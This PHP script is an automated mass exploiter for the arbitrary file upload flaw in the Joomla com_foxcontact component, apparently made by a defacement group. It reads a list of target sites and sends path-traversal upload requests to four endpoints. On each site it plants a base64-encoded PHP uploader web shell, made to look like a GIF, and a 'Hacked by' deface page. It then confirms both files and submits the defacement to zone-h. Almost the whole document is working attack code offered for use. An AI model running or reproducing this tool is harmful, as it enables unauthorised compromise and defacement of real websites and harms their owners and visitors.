<?php

/**

Joomla Component com_foxcontact Arbitrary File Upload
https://cxsecurity.com/issue/WLB-2016050072

Auto Exploiter (Shell Upload, Auto Deface, and Auto Submit Zone -H)
Coded by: L0c4lh34rtz - 

*/

error_reporting(0);
set_time_limit(0);

Class IDX_Foxcontact {
	public  $url;
	private $file = [];

	/* Nick Hacker Kalian / Nick Zone -H Kalian */
	/* Pastikan dalam script deface kalian terdapat kata HACKED */
	private $hacker = "L0c4lh34rtz";

	/* script uploader, sebaiknya jangan di otak-atik */
	private $uploader  = 'R0lGODlhOw0KPGh0bWw+DQo8dGl0bGU+VXBsb2FkZXIgQnkgSW5kb1hwbG9pdCBCT1Q8L3RpdGxlPg0KPHA+PD9waHAgZWNobyAnPGI+Jy5waHBfdW5hbWUoKS4nPC9iPic7ID8+PGJyPg0KPD9waHAgZWNobyAnPGI+Jy5nZXRjd2QoKS4nPC9iPic7ID8+PC9wPg0KPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz4NCjxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSdpZHhfZmlsZSc+DQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0ndXBsb2FkJyBuYW1lPSd1cGxvYWQnPg0KPC9mb3JtPg0KPD9waHAgaWYoaXNzZXQoJF9QT1NUWyd1cGxvYWQnXSkpIHsgaWYoQGNvcHkoJF9GSUxFU1snaWR4X2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddLiAnWzxiPk9LPC9iPl0nOyB9IGVsc2UgeyBlY2hvJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddLiAnWzxiPkZBSUxFRDwvYj4nOyB9IH0gPz4=';
		
	/* script deface, ubah bagian ini ke base64 script deface kalian */
	private $deface    = 'DQo8IS0tDQphZG1pbkBpbmRveHBsb2l0Lm9yLmlkDQoNCiNQYXRjaCBZb3VyIFN5c3RlbQ0KLS0+DQo8IURPQ1RZUEUgSFRNTD4NCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+SGFja2VkIGJ5IEwwYzRsaDM0cnR6fjwvdGl0bGU+DQo8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQo8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IkwwYzRsaDM0cnR6ICNJbmRvWHBsb2l0ICNTYW5qdW5nYW5KaXdhIj4NCjxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJJbmRvWHBsb2l0LCBTYW5qdW5nYW4gSml3YSwgSGFja2VkIGJ5IEluZG9YcGxvaXQsIEhhY2tlZCBieSBMMGM0bGgzNHJ0eiI+DQo8bWV0YSBwcm9wZXJ0eT0ib2c6a2V5d29yZHMiIGNvbnRlbnQ9IkluZG9YcGxvaXQsIFNhbmp1bmdhbiBKaXdhLCBIYWNrZWQgYnkgSW5kb1hwbG9pdCwgSGFja2VkIGJ5IEwwYzRsaDM0cnR6Ij4NCjxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJIYWNrZWQgYnkgTDBjNGxoMzRydHogfCBJbmRvWHBsb2l0IC0gU2FuanVuZ2FuIEppd2EiPg0KPG1ldGEgcHJvcGVydHk9Im9nOmRlc2NyaXB0aW9uIiBjb250ZW50PSJIYWNrZWQgYnkgTDBjNGxoMzRydHogfCBJbmRvWHBsb2l0IC0gU2FuanVuZ2FuIEppd2EiPg0KPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vZmxhLmZnLWEuY29tL2ZsYWdzL2luZG9uZXNpYS1mbGFnLWJ1dHRvbi0yLnBuZyI+DQo8c3R5bGU+DQpoMSB7DQoJbWFyZ2luLXRvcDogNGVtOw0KCWZvbnQtZmFtaWx5OiBtb25vc3BhY2U7DQoJZm9udC1zaXplOiA0NXB4Ow0KfQ0KDQpib2R5IHsgDQoJYmFja2dyb3VuZDogYmxhY2s7IA0KCXRleHQtYWxpZ246IGNlbnRlcjsgDQoJdGV4dC1zaGFkb3c6IDFweCAxcHggIzE3YTI0ZjsgDQoJZm9udC1mYW1pbHk6Q291cmllciBOZXc7IA0KCWNvbG9yOiB3aGl0ZTsgDQp9IA0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPGgxPkhhY2tlZCBieSBMMGM0bGgzNHJ0ejwvaDE+DQo8cD48Zm9udCBzaXplPSIyIj4jPG1hcnF1ZWUgYmVoYXZpb3I9ImFsdGVybmF0ZSIgc2Nyb2xsYW1vdW50PSI0IiB3aWR0aD0iNDAlIj5JbmRvWHBsb2l0IC0gU2FuanVuZ2FuIEppd2EgLSBEZXBvayBDeWJlciBTZWN1cml0eSA8L21hcnF1ZWU+IzwvZm9udD48L3A+DQo8aWZyYW1lIHNyYz0iaHR0cDovL3d3dy55b3V0dWJlLmNvbS9lbWJlZC9Fem14N21VNnF0Zz9yZWw9MCZhbXA7YXV0b3BsYXk9MSZhbXA7bG9vcD0xJmFtcDtwbGF5bGlzdD1Fem14N21VNnF0ZyIgZnJhbWVib3JkZXI9IjAiIGhlaWdodD0iMSIgd2lkdGg9IjEiPjwvaWZyYW1lPg0KPC9ib2R5Pg0KPC9odG1sPg0KPG5vc2NyaXB0Pg0KPCEtLQ==';

		 

	public function __construct() {
		$this->file = (object) $this->file;

		/* Nama file deface kalian */
		$this->file->deface 	= "l0c.htm";

		$this->file->shell 		= $this->randomFileName().".php";
	}

	public function validUrl() {
		if(!preg_match("/^http:\/\//", $this->url) AND !preg_match("/^https:\/\//", $this->url)) {
			$url = "http://".$this->url;
			return $url;
		} else {
			return $this->url;
		}
	}

	public function randomFileName() {
		$characters = implode("", range(0,9)).implode("", range("A","Z")).implode("", range("a","z"));
		$generate   = substr(str_shuffle($characters), 0, rand(4, 8));

		$prefixFilename = "\x69\x6e\x64\x6f\x78\x70\x6c\x6f\x69\x74"."_";
		return $prefixFilename.$generate;
	}

	public function curl($url, $data = null, $headers = null, $cookie = true) {
		$ch = curl_init();
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
			  curl_setopt($ch, CURLOPT_URL, $url);
			  curl_setopt($ch, CURLOPT_USERAGENT, "IndoXploitTools/1.1");
			  //curl_setopt($ch, CURLOPT_VERBOSE, TRUE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
			  curl_setopt($ch, CURLOPT_TIMEOUT, 5);

		if($data !== null) {
			  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
			  curl_setopt($ch, CURLOPT_POST, TRUE);
			  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		}

		if($headers !== null) {
			  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		}

		if($cookie === true) {
			  curl_setopt($ch, CURLOPT_COOKIE, TRUE);
			  curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
			  curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
		}

		$exec = curl_exec($ch);
		$info = curl_getinfo($ch);

			  curl_close($ch);

		return (object) [
			"response" 	=> $exec,
			"info"		=> $info
		];

	}

	public function getId() {
		$url 		= $this->url;
		$getContent = $this->curl($url)->response;
		preg_match_all("/<a name=\"cid_(.*?)\">/", $getContent, $cid);
		preg_match_all("/<a name=\"mid_(.*?)\">/", $getContent, $mid);

		return (object) [
			"cid" => ($cid[1][0] === NULL ? 0 : $cid[1][0]),
			"mid" => ($mid[1][0] === NULL ? 0 : $mid[1][0]),
		];
	}

	public function exploit() {
		$getCid = $this->getId()->cid;
		$getMid = $this->getId()->mid;

		$url	= (object) parse_url($this->url);

		$headers = [
			"X-Requested-With: XMLHttpRequest",
			"X-File-Name: ".$this->file->shell,
			"Content-Type: image/jpeg"
		];

		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->uploader), $headers);
		}

		$shell = $url->scheme."://".$url->host."/components/com_foxcontact/".$this->file->shell;
		$check = $this->curl($shell)->response;
		if(preg_match("/Uploader By IndoXploit BOT/i", $check)) {
			print "[+] Shell OK: ".$shell."\n";
			$this->save($shell);
		} else {
			print "[-] Shell Failed\n";
		}
		
		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->deface), $headers);
		}

		$deface = $url->scheme."://".$url->host."/".$this->file->deface;
		$check = $this->curl($deface)->response;
		if(preg_match("/hacked/i", $check)) {
			print "[+] Deface OK: ".$deface."\n";
			$this->zoneh($deface);
			$this->save($deface);
		} else {
			print "[-] Deface Failed\n";
		}
	}

	public function zoneh($url) {
		$post = $this->curl("http://www.zone-h.com/notify/single", "defacer=".$this->hacker."&domain1=$url&hackmode=1&reason=1&submit=Send",null,false);
		if(preg_match("/color=\"red\">(.*?)<\/font><\/li>/i", $post->response, $matches)) {
			if($matches[1] === "ERROR") {
				preg_match("/<font color=\"red\">ERROR:<br\/>(.*?)<br\/>/i", $post->response, $matches2);
				print "[-] Zone-H ($url) [ERROR: ".$matches2[1]."]\n\n";
			} else {
				print "[+] Zone-H ($url) [OK]\n\n";
			}
		}
	}

	public function save($isi) {
		$handle = fopen("result_foxcontact.txt", "a+");
		fwrite($handle, "$isi\n");
		fclose($handle);
	}
} 	

if(!isset($argv[1])) die("!! Usage: php ".$argv[0]." target.txt");
if(!file_exists($argv[1])) die("!! File target ".$argv[1]." tidak di temukan!!");
$open = explode("\n", file_get_contents($argv[1]));

foreach($open as $list) {
	$fox = new IDX_Foxcontact();
	$fox->url = trim($list);
	$fox->url = $fox->validUrl();

	print "[*] Exploiting ".parse_url($fox->url, PHP_URL_HOST)."\n";
	$fox->exploit();
}